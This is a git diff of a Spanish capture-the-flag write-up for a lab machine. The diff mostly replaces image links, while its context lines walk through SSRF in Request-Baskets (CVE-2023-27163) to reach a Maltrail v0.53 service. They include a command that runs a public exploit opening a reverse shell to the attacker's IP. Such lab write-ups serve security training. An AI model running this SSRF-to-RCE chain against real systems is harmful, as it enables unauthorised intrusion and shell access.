@@ -1,9 +1,11 @@
-![[Pasted image 20250505141106.png]]
+![image](https://github.com/user-attachments/assets/54bdba6a-7b6f-4282-a0e5-ece14204dcba)
 
 
-**Publicado:** 06 de Mayo de 2025 
-**Autor:** José Miguel Romero aka x3m1Sec 
-**Dificultad:** ⭐ Fácil
+
+
+**Publicado:** 06 de Mayo de 2025   
+**Autor:** José Miguel Romero aka x3m1Sec   
+**Dificultad:** ⭐ Fácil  
 
 ## 📝 Descripción
 
@@ -120,7 +122,8 @@ En base al escaneo de nmap verificamos que los puertos 22 y 55555 están abierto
 
 http://10.10.11.224:55555/web
 
-![[Pasted image 20250505142025.png]]
+![image](https://github.com/user-attachments/assets/504a2cd5-2e21-4242-bf3c-21885da00e1c)
+
 
 Descubrimos que se trata de un http collector para testear webhooks, notificaciones, etc:
 
@@ -144,9 +147,7 @@ Las principales características de esta vulnerabilidad son:
 
 CVE-2023–27163 representa una vulnerabilidad crítica de Server-Side Request Forgery (SSRF) que se identificó en Request-Baskets, afectando a todas las versiones hasta e incluyendo [1.2.1](https://github.com/advisories/GHSA-58g2-vgpg-335q). Esta vulnerabilidad en particular otorga a los actores maliciosos la capacidad de obtener acceso no autorizado a los recursos de la red e información confidencial explotando el `/api/baskets/{name}` componente a través de solicitudes API cuidadosamente diseñadas.
 
-
-![[Pasted image 20250505151156.png]]
-
+![image](https://github.com/user-attachments/assets/72179e20-9b92-4dda-88c1-411d578f26c7)
 
 
 ### ¿Cómo funciona?
@@ -164,7 +165,8 @@ La explotación del ataque SSRF nos puede permitir el acceso no autenticado a cu
 
 En primer lugar creamos una cesta para intentar aprovechar la vulnerabilidad SSRF para enumerar los servicios internos que se ejecutan en la máquina internos que se ejecutan en la máquina.:
 
-![[Pasted image 20250505151959.png]]
+![image](https://github.com/user-attachments/assets/67f6932a-f841-453c-8049-2f62854182c3)
+
 
 
 Para comprobar si la instancia es vulnerable, primero iniciamos una escucha Netcat en el puerto 8000 e intentamos enviar una petición HTTP a nuestra IP.
@@ -177,7 +179,8 @@ Ahora que ya  tenemos nuestro listener Netcat funcionando, podemos proceder a in
 
 Hacemos clic en el signo de engranaje en la esquina superior izquierda de nuestra cesta para que aparezcan los ajustes de configuración.
 
-![[Pasted image 20250505152316.png]]
+![image](https://github.com/user-attachments/assets/09f66226-f660-4e4b-87ee-dc08ed7e5347)
+
 
 Ahora podemos lanzar un curl para verificar que recibimos la petición en nuestro listener
 ```
@@ -185,12 +188,14 @@ curl http://10.10.11.224:55555/test
 ```
 
 
-![[Pasted image 20250505152422.png]]
+![image](https://github.com/user-attachments/assets/7958683f-912c-4429-8f59-5764bc56d0ff)
+
 Ya que hemos descubierto que la instancia es vulnerable y el escaneo Nmap mostró el puerto 80 como filtrado, podemos usar esto para comprobar qué servicio se ejecuta en el puerto. 
 
 Editaremos nuestra configuración proxy de nuevo y estableceremos la URL de reenvío en http://127.0.0.1:80 . También habilitaremos los siguientes ajustes:
 
-![[Pasted image 20250505152835.png]]
+![image](https://github.com/user-attachments/assets/4840f2b0-9fa5-44a5-b29c-4271a9ec5d39)
+
 
 Proxy Response - Esto permite que la cesta se comporte como un proxy completo: respuestas del servicio subyacente configurado en forward_url.
 configurado en forward_url se devuelven a los clientes de las solicitudes originales. La configuración de
@@ -201,7 +206,8 @@ Expandir ruta de reenvío - Con esta opción, la ruta de la URL de reenvío se e
 
 Ahora basta con acceder a: http://10.10.11.224:55555/web/test y accederemos con éxito al servicio del puerto 80 que estaba filtrado:
 
-![[Pasted image 20250505152936.png]]
+![image](https://github.com/user-attachments/assets/d0001f90-87eb-41e5-9282-aebc90977b32)
+
 
 Al acceder al servicio, vemos que se trata de un servicio mailtrail v0.53 el cual parece que es vulnerable a Unauthenticated OS Command Injection (RCE):
 
@@ -222,9 +228,11 @@ https://github.com/spookier/Maltrail-v0.53-Exploit
 python3 exploit.py 10.10.14.8 1234 http://10.10.11.224:55555/test
 ```
 
-![[Pasted image 20250505153319.png]]
+![image](https://github.com/user-attachments/assets/a435371e-cbf1-49d9-ba56-70bd20b230e8)
 
-![[Pasted image 20250505153328.png]]
+
+![image](https://github.com/user-attachments/assets/636272c0-cde3-494e-8824-d4da772b6906)
+
 
 Hacemos un spawn de la tty:
 
@@ -277,4 +285,4 @@ cat root.txt
 d9a74************56f54743813
 ```
 
-![[Pasted image 20250505154052.png]]
+![image](https://github.com/user-attachments/assets/424a5fd0-bea7-4971-917f-f24a3cd4169c)
